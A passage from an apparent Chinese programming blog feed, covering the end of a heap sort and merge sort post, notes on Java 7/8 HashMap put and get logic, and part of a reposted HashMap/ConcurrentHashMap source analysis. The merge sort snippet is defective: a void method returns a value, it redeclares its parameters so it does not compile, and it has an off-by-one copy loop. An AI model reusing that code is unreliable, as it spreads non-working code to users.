class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">heap</span><span class="params">(<span class="type">int</span>[] a)</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> a.length;</span><br><span class="line">    build(a,len);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=len-<span class="number">1</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="type">int</span> tmp=a[<span class="number">0</span>];</span><br><span class="line">        a[<span class="number">0</span>]=a[i];</span><br><span class="line">        a[i]=tmp;</span><br><span class="line">        len--;</span><br><span class="line">        sink(a,<span class="number">0</span>,len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">build</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=len/<span class="number">2</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        sink(a,i,len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sink</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> i,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="type">int</span> left=i*<span class="number">2</span>+<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> right=<span class="number">2</span>*i+<span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> present=i;</span><br><span class="line">    <span class="keyword">if</span>(left&lt;len&amp;&amp;a[left]&gt;a[present]) present=left;</span><br><span class="line">    <span class="keyword">if</span>(right&lt;len&amp;&amp;a[right]&gt;a[present]) present=right;</span><br><span class="line">    <span class="keyword">if</span>(present!=i)&#123;</span><br><span class="line">        <span class="type">int</span> tmp=a[i];</span><br><span class="line">        a[i]=a[present];</span><br><span class="line">        a[present]=tmp;</span><br><span class="line">        sink(a,present,len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在构建堆的过程中，因为我们是完全二叉树从最下层最右边的非终端结点开始构建，将它与其孩子进行比较和若有必要的互换，对于每个非终端结点来说，其实最多进行两次比较和互换操作，因此整个构建堆的时间复杂度为O(n)。</p><p>在正式排序时，第i次取堆顶记录重建堆需要用O(logi)的时间（完全二叉树的某个结点到根结点的距离为.log2i.＋1），并且需要取n－1次堆顶记录，因此，重建堆的时间复杂度为O(nlogn)。</p><h2><span id="归并排序">归并排序 √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span> a[])</span>&#123;</span><br><span class="line"><span class="keyword">return</span> sort(a,<span class="number">0</span>,a.length-<span class="number">1</span>,<span class="keyword">new</span> <span class="title class_">int</span>[a.length]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> lo,<span class="type">int</span> hi,<span class="type">int</span>[] tmp)</span>&#123;</span><br><span class="line">    <span class="type">int</span> lo=<span class="number">0</span>,hi=a.length-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(lo&lt;hi)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> lo+(hi-lo)/<span class="number">2</span>;</span><br><span class="line">        sort(a,lo,mid,tmp);</span><br><span class="line">        sort(a,mid+<span class="number">1</span>,hi,tmp);</span><br><span class="line">        mergeArray(a,lo,mid,hi,tmp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">mergeArray</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> lo,<span class="type">int</span> mid,<span class="type">int</span> hi,<span class="type">int</span>[] tmp)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=lo,m=mid,j=mid+<span class="number">1</span>,n=hi,k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=m&amp;&amp;j&lt;=n)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;=a[j])&#123;</span><br><span class="line">            tmp[k++]=a[i++];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            tmp[k++]=a[j++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=m) tmp[k++]=a[i++];</span><br><span class="line">    <span class="keyword">while</span>(j&lt;=n) tmp[k++]=a[j++];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> l=<span class="number">0</span>;l&lt;=k;l++)&#123;</span><br><span class="line">        a[l+lo]=tmp[l];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>公式：T[n]  &#x3D;  2T[n&#x2F;2] + O(n)；</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;面试常考的coding&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="https://disda-coding.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="面试常考算法题" scheme="https://disda-coding.github.io/tags/%E9%9D%A2%E8%AF%95%E5%B8%B8%E8%80%83%E7%AE%97%E6%B3%95%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>SourceCode</title>
    <link href="https://disda-coding.github.io/2020/04/12/SourceCode/"/>
    <id>https://disda-coding.github.io/2020/04/12/SourceCode/</id>
    <published>2020-04-12T11:26:06.000Z</published>
    <updated>2020-04-12T12:58:36.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#hashmap">HashMap</a><ul><li><a href="#hashmap-17">HashMap 1.7</a><ul><li><a href="#put-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90">put 过程分析</a></li><li><a href="#get-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90">get 过程分析</a></li><li><a href="#hashmap%E6%89%A9%E5%AE%B9%E6%AD%BB%E9%94%81%E9%97%AE%E9%A2%98">HashMap扩容死锁问题</a></li></ul></li><li><a href="#hashmap-18">HashMap 1.8</a><ul><li><a href="#put%E6%96%B9%E6%B3%95%E7%9A%84%E9%80%BB%E8%BE%91">put方法的逻辑</a></li><li><a href="#get%E6%96%B9%E6%B3%95%E7%9A%84%E9%80%BB%E8%BE%91">get方法的逻辑</a></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="hashmap">HashMap</span></h1><h2><span id="hashmap-17">HashMap 1.7</span></h2><p><strong>数据结构</strong>： 数组+链表</p><p><strong>元素结构：</strong>Entry</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Entry</span>&lt;K,V&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry&lt;K,V&gt;&#123;</span><br><span class="line">    <span class="keyword">final</span> K key;</span><br><span class="line">    V value;</span><br><span class="line">    Entry&lt;K,V&gt; next;</span><br><span class="line">    <span class="type">int</span> hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>capacity：当前数组容量，始终保持 2^n，可以扩容，扩容后数组大小为当前的 2 倍。</p><p>loadFactor：负载因子，默认为 0.75。</p><p>threshold：扩容的阈值，等于 capacity * loadFactor</p><p>HashMap如果key为null则放入table[0]中</p><p>遍历完链表发现没有key，就需要添加entry。</p><p>添加entry前判断是否需要扩容（如果当前 HashMap 大小已经达到了阈值，并且新值要插入的数组位置已经有元素了，那么要扩容）</p><h3><span id="put-过程分析">put 过程分析</span></h3><ol><li>如果HashMap未被初始化，则初始化</li><li>如果key为null，则下标为0</li><li>如果key不为null，计算hash值并找到对应下标</li><li>遍历下标处的链表看是否存在重复key，存在则覆盖。</li><li>不存在的话，判断是否需要扩容。</li><li>不需要扩容就将entry头插法添加到链表中。</li></ol><h3><span id="get-过程分析">get 过程分析</span></h3><p>相对于 put 过程，get 过程是非常简单的。</p><ol><li>根据 key 计算 hash 值。</li><li>找到相应的数组下标：hash &amp; (length - 1)。</li><li>遍历该数组位置处的链表，直到找到相等(&#x3D;&#x3D;或equals)的 key。</li></ol><h3><span id="hashmap扩容死锁问题">HashMap扩容死锁问题</span></h3><p>因为在 JDK1.7 中采取的是<strong>头插法</strong>，遍历一个节点就插入一个节点到新的哈希桶数组，所以才会导致出现循环链表。但 JDK1.8 中是采用<strong>两个头结点来保持旧链表的引用，直到该索引处对应的链表全部遍历完之后再分别把头结点放在新的哈希桶数组对应的位置。</strong>而不是遍历一个节点就插入一个节点到新的哈希桶数组。所以不会出现死链。</p><h2><span id="hashmap-18">HashMap 1.8</span></h2><p>将Entry改名为Node</p><p><strong>Java7 是先扩容后插入新值的，Java8 先插值再扩容</strong></p><p><strong>Java7是头插法，Java8是尾插法</strong></p><h3><span id="put方法的逻辑">put方法的逻辑</span></h3><ol><li><p>如果HashMap未被初始化，则resize初始化</p></li><li><p>对Key求Hash值，然后再计算下标</p></li><li><p>如果没有碰撞，直接放入桶中</p></li><li><p>如果碰撞了，key相等就取出节点</p></li><li><p>如果是红黑树就以红黑树的方式插入节点，如果为链表以链表的方式链接到后面，</p></li><li><p>如果插入后链表长度超过阈值8，就把链表转成红黑树</p></li><li><p>如果节点已经存在就替换旧值</p></li><li><p>如果桶满了（容量16*加载因子0.75），就需要resize（扩容2倍后重排）</p></li></ol><h3><span id="get方法的逻辑">get方法的逻辑</span></h3><ol><li><p>计算 key 的 hash 值，根据 hash 值找到对应数组下标:     hash &amp; (length-1)</p></li><li><p>判断数组该位置处的元素是否刚好就是我们要找的</p></li><li><p>如果不是，判断该元素类型是否是 TreeNode，如果是，用红黑树的方法取数据。</p><p>4 . 如果不是，遍历链表，直到找到相等(&#x3D;&#x3D;或equals)的 key。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="面试" scheme="https://disda-coding.github.io/categories/%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="源码" scheme="https://disda-coding.github.io/tags/%E6%BA%90%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>Java7/8 中的 HashMap 和 ConcurrentHashMap 全解析（转）</title>
    <link href="https://disda-coding.github.io/2020/04/12/Java7_8+%E4%B8%AD%E7%9A%84+HashMap+%E5%92%8C+ConcurrentHashMap+%E5%85%A8%E8%A7%A3%E6%9E%90/"/>
    <id>https://disda-coding.github.io/2020/04/12/Java7_8+%E4%B8%AD%E7%9A%84+HashMap+%E5%92%8C+ConcurrentHashMap+%E5%85%A8%E8%A7%A3%E6%9E%90/</id>
    <published>2020-04-12T11:19:38.000Z</published>
    <updated>2020-04-12T11:20:40.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今天发一篇”水文”，可能很多读者都会表示不理解，不过我想把它作为并发序列文章中不可缺少的一块来介绍。本来以为花不了多少时间的，不过最终还是投入了挺多时间来完成这篇文章的。</p><p>网上关于 HashMap 和 ConcurrentHashMap 的文章确实不少，不过缺斤少两的文章比较多，所以才想自己也写一篇，把细节说清楚说透，尤其像 Java8 中的 ConcurrentHashMap，大部分文章都说不清楚。终归是希望能降低大家学习的成本，不希望大家到处找各种不是很靠谱的文章，看完一篇又一篇，可是还是模模糊糊。</p><p>阅读建议：四节基本上可以进行独立阅读，建议初学者可按照 Java7 HashMap -&gt; Java7 ConcurrentHashMap -&gt; Java8 HashMap -&gt; Java8 ConcurrentHashMap 顺序进行阅读，可适当降低阅读门槛。</p><p>阅读前提：本文分析的是源码，所以至少读者要熟悉它们的接口使用，同时，对于并发，读者至少要知道 CAS、ReentrantLock、UNSAFE 操作这几个基本的知识，文中不会对这些知识进行介绍。Java8 用到了红黑树，不过本文不会进行展开，感兴趣的读者请自行查找相关资料。</p><!-- toc --><ul><li><a href="#java7-hashmap">Java7 HashMap</a><ul><li><a href="#put-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90">put 过程分析</a><ul><li><a href="#%E6%95%B0%E7%BB%84%E5%88%9D%E5%A7%8B%E5%8C%96">数组初始化</a></li><li><a href="#%E8%AE%A1%E7%AE%97%E5%85%B7%E4%BD%93%E6%95%B0%E7%BB%84%E4%BD%8D%E7%BD%AE">计算具体数组位置</a></li><li><a href="#%E6%B7%BB%E5%8A%A0%E8%8A%82%E7%82%B9%E5%88%B0%E9%93%BE%E8%A1%A8%E4%B8%AD">添加节点到链表中</a></li><li><a href="#%E6%95%B0%E7%BB%84%E6%89%A9%E5%AE%B9">数组扩容</a></li></ul></li><li><a href="#get-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90">get 过程分析</a></li></ul></li><li><a href="#java7-concurrenthashmap">Java7 ConcurrentHashMap</a><ul><li><a href="#%E5%88%9D%E5%A7%8B%E5%8C%96">初始化</a></li><li><a href="#put-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90-1">put 过程分析</a><ul><li><a href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%A7%BD-ensuresegment">初始化槽: ensureSegment</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E5%86%99%E5%85%A5%E9%94%81-scanandlockforput">获取写入锁: scanAndLockForPut</a></li><li><a href="#%E6%89%A9%E5%AE%B9-rehash">扩容: rehash</a></li></ul></li><li><a href="#get-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90-1">get 过程分析</a></li><li><a href="#%E5%B9%B6%E5%8F%91%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90">并发问题分析</a></li></ul></li><li><a href="#java8-hashmap">Java8 HashMap</a><ul><li><a href="#put-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90-2">put 过程分析</a><ul><li><a href="#%E6%95%B0%E7%BB%84%E6%89%A9%E5%AE%B9-1">数组扩容</a></li></ul></li><li><a href="#get-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90-2">get 过程分析</a></li></ul></li><li><a href="#java8-concurrenthashmap">Java8 ConcurrentHashMap</a><ul><li><a href="#%E5%88%9D%E5%A7%8B%E5%8C%96-1">初始化</a></li><li><a href="#put-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90-3">put 过程分析</a><ul><li><a href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%95%B0%E7%BB%84inittable">初始化数组：initTable</a></li><li><a href="#%E9%93%BE%E8%A1%A8%E8%BD%AC%E7%BA%A2%E9%BB%91%E6%A0%91-treeifybin">链表转红黑树: treeifyBin</a></li></ul></li><li><a href="#%E6%89%A9%E5%AE%B9trypresize">扩容：tryPresize</a><ul><li><a href="#%E6%95%B0%E6%8D%AE%E8%BF%81%E7%A7%BBtransfer">数据迁移：transfer</a></li></ul></li><li><a href="#get-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90-3">get 过程分析</a></li></ul></li><li><a href="#%E6%80%BB%E7%BB%93">总结</a></li></ul><!-- tocstop --><h2><span id="java7-hashmap">Java7 HashMap</span></h2><p>HashMap 是最简单的，一来我们非常熟悉，二来就是它不支持并发操作，所以源码也非常简单。</p><p>首先，我们用下面这张图来介绍 HashMap 的结构。</p><p><img src="https://www.javadoop.com/blogimages/map/1.png" alt="1"></p><blockquote><p>这个仅仅是示意图，因为没有考虑到数组要扩容的情况，具体的后面再说。</p></blockquote><p>大方向上，HashMap 里面是一个<strong>数组</strong>，然后数组中每个元素是一个<strong>单向链表</strong>。</p><p>上图中，每个绿色的实体是嵌套类 Entry 的实例，Entry 包含四个属性：key, value, hash 值和用于单向链表的 next。</p><p>capacity：当前数组容量，始终保持 2^n，可以扩容，扩容后数组大小为当前的 2 倍。</p><p>loadFactor：负载因子，默认为 0.75。</p><p>threshold：扩容的阈值，等于 capacity * loadFactor</p><h3><span id="put-过程分析">put 过程分析</span></h3><p>还是比较简单的，跟着代码走一遍吧。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="comment">// 当插入第一个元素的时候，需要先初始化数组大小</span></span><br><span class="line">    <span class="keyword">if</span> (table == EMPTY_TABLE) &#123;</span><br><span class="line">        inflateTable(threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果 key 为 null，感兴趣的可以往里看，最终会将这个 entry 放到 table[0] 中</span></span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">    <span class="comment">// 1. 求 key 的 hash 值</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">    <span class="comment">// 2. 找到对应的数组下标</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line">    <span class="comment">// 3. 遍历一下对应下标处的链表，看是否有重复的 key 已经存在，</span></span><br><span class="line">    <span class="comment">//    如果有，直接覆盖，put 方法返回旧值就结束了</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(<span class="built_in">this</span>);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="comment">// 4. 不存在重复的 key，将此 entry 添加到链表中，细节后面说</span></span><br><span class="line">    addEntry(hash, key, value, i);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="数组初始化">数组初始化</span></h4><p>在第一个元素插入 HashMap 的时候做一次数组的初始化，就是先确定初始的数组大小，并计算数组扩容的阈值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">inflateTable</span><span class="params">(<span class="type">int</span> toSize)</span> &#123;</span><br><span class="line">    <span class="comment">// 保证数组大小一定是 2 的 n 次方。</span></span><br><span class="line">    <span class="comment">// 比如这样初始化：new HashMap(20)，那么处理成初始数组大小是 32</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> roundUpToPowerOf2(toSize);</span><br><span class="line">    <span class="comment">// 计算扩容阈值：capacity * loadFactor</span></span><br><span class="line">    threshold = (<span class="type">int</span>) Math.min(capacity * loadFactor, MAXIMUM_CAPACITY + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 算是初始化数组吧</span></span><br><span class="line">    table = <span class="keyword">new</span> <span class="title class_">Entry</span>[capacity];</span><br><span class="line">    initHashSeedAsNeeded(capacity); <span class="comment">//ignore</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个将数组大小保持为 2 的 n 次方的做法，Java7 和 Java8 的 HashMap 和 ConcurrentHashMap 都有相应的要求，只不过实现的代码稍微有些不同，后面再看到的时候就知道了。</p><h4><span id="计算具体数组位置">计算具体数组位置</span></h4><p>这个简单，我们自己也能 YY 一个：使用 key 的 hash 值对数组长度进行取模就可以了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="type">int</span> <span class="title function_">indexFor</span><span class="params">(<span class="type">int</span> hash, <span class="type">int</span> length)</span> &#123;</span><br><span class="line">    <span class="comment">// assert Integer.bitCount(length) == 1 : &quot;length must be a non-zero power of 2&quot;;</span></span><br><span class="line">    <span class="keyword">return</span> hash &amp; (length-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法很简单，简单说就是取 hash 值的低 n 位。如在数组长度为 32 的时候，其实取的就是 key 的 hash 值的低 5 位，作为它在数组中的下标位置。</p><h4><span id="添加节点到链表中">添加节点到链表中</span></h4><p>找到数组下标后，会先进行 key 判重，如果没有重复，就准备将新值放入到链表的<strong>表头</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">addEntry</span><span class="params">(<span class="type">int</span> hash, K key, V value, <span class="type">int</span> bucketIndex)</span> &#123;</span><br><span class="line">    <span class="comment">// 如果当前 HashMap 大小已经达到了阈值，并且新值要插入的数组位置已经有元素了，那么要扩容</span></span><br><span class="line">    <span class="keyword">if</span> ((size &gt;= threshold) &amp;&amp; (<span class="literal">null</span> != table[bucketIndex])) &#123;</span><br><span class="line">        <span class="comment">// 扩容，后面会介绍一下</span></span><br><span class="line">        resize(<span class="number">2</span> * table.length);</span><br><span class="line">        <span class="comment">// 扩容以后，重新计算 hash 值</span></span><br><span class="line">        hash = (<span class="literal">null</span> != key) ? hash(key) : <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 重新计算扩容后的新的下标</span></span><br><span class="line">        bucketIndex = indexFor(hash, table.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 往下看</span></span><br><span class="line">    createEntry(hash, key, value, bucketIndex);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这个很简单，其实就是将新值放到链表的表头，然后 size++</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">createEntry</span><span class="params">(<span class="type">int</span> hash, K key, V value, <span class="type">int</span> bucketIndex)</span> &#123;</span><br><span class="line">    Entry&lt;K,V&gt; e = table[bucketIndex];</span><br><span class="line">    table[bucketIndex] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    size++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法的主要逻辑就是先判断是否需要扩容，需要的话先扩容，然后再将这个新的数据插入到扩容后的数组的相应位置处的链表的表头。</p><h4><span id="数组扩容">数组扩容</span></h4><p>前面我们看到，在插入新值的时候，如果<strong>当前的 size 已经达到了阈值，并且要插入的数组位置上已经有元素</strong>，那么就会触发扩容，扩容后，数组大小为原来的 2 倍。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">resize</span><span class="params">(<span class="type">int</span> newCapacity)</span> &#123;</span><br><span class="line">    Entry[] oldTable = table;</span><br><span class="line">    <span class="type">int</span> <span class="variable">oldCapacity</span> <span class="operator">=</span> oldTable.length;</span><br><span class="line">    <span class="keyword">if</span> (oldCapacity == MAXIMUM_CAPACITY) &#123;</span><br><span class="line">        threshold = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 新的数组</span></span><br><span class="line">    Entry[] newTable = <span class="keyword">new</span> <span class="title class_">Entry</span>[newCapacity];</span><br><span class="line">    <span class="comment">// 将原来数组中的值迁移到新的更大的数组中</span></span><br><span class="line">    transfer(newTable, initHashSeedAsNeeded(newCapacity));</span><br><span class="line">    table = newTable;</span><br><span class="line">    threshold = (<span class="type">int</span>)Math.min(newCapacity * loadFactor, MAXIMUM_CAPACITY + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>扩容就是用一个新的大数组替换原来的小数组，并将原来数组中的值迁移到新的数组中。</p><p>由于是双倍扩容，迁移过程中，会将原来 table[i] 中的链表的所有节点，分拆到新的数组的 newTable[i] 和 newTable[i + oldLength] 位置上。如原来数组长度是 16，那么扩容后，原来 table[0] 处的链表中的所有元素会被分配到新数组中 newTable[0] 和 newTable[16] 这两个位置。代码比较简单，这里就不展开了。</p><h3><span id="get-过程分析">get 过程分析</span></h3><p>相对于 put 过程，get 过程是非常简单的。</p><ol><li>根据 key 计算 hash 值。</li><li>找到相应的数组下标：hash &amp; (length - 1)。</li><li>遍历该数组位置处的链表，直到找到相等(&#x3D;&#x3D;或equals)的 key。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// 之前说过，key 为 null 的话，会被放到 table[0]，所以只要遍历下 table[0] 处的链表就可以了</span></span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> getForNullKey();</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    Entry&lt;K,V&gt; entry = getEntry(key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span> == entry ? <span class="literal">null</span> : entry.getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getEntry(key):</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Entry&lt;K,V&gt; <span class="title function_">getEntry</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : hash(key);</span><br><span class="line">    <span class="comment">// 确定数组下标，然后从头开始遍历链表，直到找到为止</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[indexFor(hash, table.length)];</span><br><span class="line">         e != <span class="literal">null</span>;</span><br><span class="line">         e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">            ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; 